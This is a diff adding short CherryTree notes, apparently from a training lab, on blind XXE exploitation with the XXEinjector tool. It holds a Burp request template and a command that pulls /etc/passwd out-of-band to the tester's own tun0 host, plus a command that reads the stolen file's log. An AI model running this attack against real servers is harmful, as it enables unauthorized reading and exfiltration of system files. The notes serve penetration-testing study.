@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="52" master_id="0" name="tools" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747770707" ts_lastsave="1747772841">
+    <rich_text>git clone </rich_text>
+    <rich_text link="webs https://github.com/enjoiz/XXEinjector.git">https://github.com/enjoiz/XXEinjector.git</rich_text>
+    <rich_text>
+
+Write http </rich_text>
+    <rich_text foreground="#ff9d00" weight="heavy">file</rich_text>
+    <rich_text> with burp request</rich_text>
+    <rich_text foreground="#ff9d00" weight="heavy">:</rich_text>
+    <rich_text>
+And in the end after xml write XXEINJECT
+
+
+
+Now run it:
+
+wobei host = unsere ip
+file = der burp request
+httpport=unser server port
+path= das file das wir holen wollen
+
+
+
+
+Files are stored in the IP/requestedfile.log
+our example:
+
+</rich_text>
+    <codebox char_offset="130" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">POST /blind/submitDetails.php HTTP/1.1&#13;
+Host: 10.129.201.94&#13;
+Content-Length: 169&#13;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#13;
+Content-Type: text/plain;charset=UTF-8&#13;
+Accept: */*&#13;
+Origin: http://10.129.201.94&#13;
+Referer: http://10.129.201.94/blind/&#13;
+Accept-Encoding: gzip, deflate&#13;
+Accept-Language: en-US,en;q=0.9&#13;
+Connection: close&#13;
+&#13;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;&#13;
+XXEINJECT</codebox>
+    <codebox char_offset="145" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter</codebox>
+    <codebox char_offset="319" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat Logs/10.129.201.94/etc/passwd.log </codebox>
+  </node>
+</cherrytree>
